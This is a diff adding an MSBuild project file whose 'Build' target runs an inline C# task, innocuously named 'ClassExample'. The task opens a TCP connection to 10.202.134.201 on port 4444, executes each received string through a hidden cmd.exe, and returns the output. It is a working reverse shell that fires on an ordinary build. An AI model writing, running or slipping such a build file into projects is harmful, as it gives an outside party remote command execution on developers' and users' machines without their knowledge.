@@ -1,0 +1,48 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Build">
+    <ClassExample />
+  </Target>
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Net.Sockets;
+        using System.Text;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+
+        public class ClassExample : Task, ITask
+        {
+            public override bool Execute()
+            {
+                using(TcpClient client = new TcpClient("10.202.134.201", 4444)) {
+                    using(NetworkStream stream = client.GetStream()) {
+                        byte[] buffer = new byte[1024];
+                        int bytes;
+                        while((bytes = stream.Read(buffer, 0, buffer.Length)) != 0) {
+                            string cmd = Encoding.ASCII.GetString(buffer, 0, bytes);
+                            System.Diagnostics.Process proc = new System.Diagnostics.Process();
+                            proc.StartInfo.FileName = "cmd.exe";
+                            proc.StartInfo.Arguments = "/c " + cmd;
+                            proc.StartInfo.RedirectStandardOutput = true;
+                            proc.StartInfo.UseShellExecute = false;
+                            proc.StartInfo.CreateNoWindow = true;
+                            proc.Start();
+                            string output = proc.StandardOutput.ReadToEnd();
+                            byte[] outBytes = Encoding.ASCII.GetBytes(output);
+                            stream.Write(outBytes, 0, outBytes.Length);
+                        }
+                    }
+                }
+                return true;
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
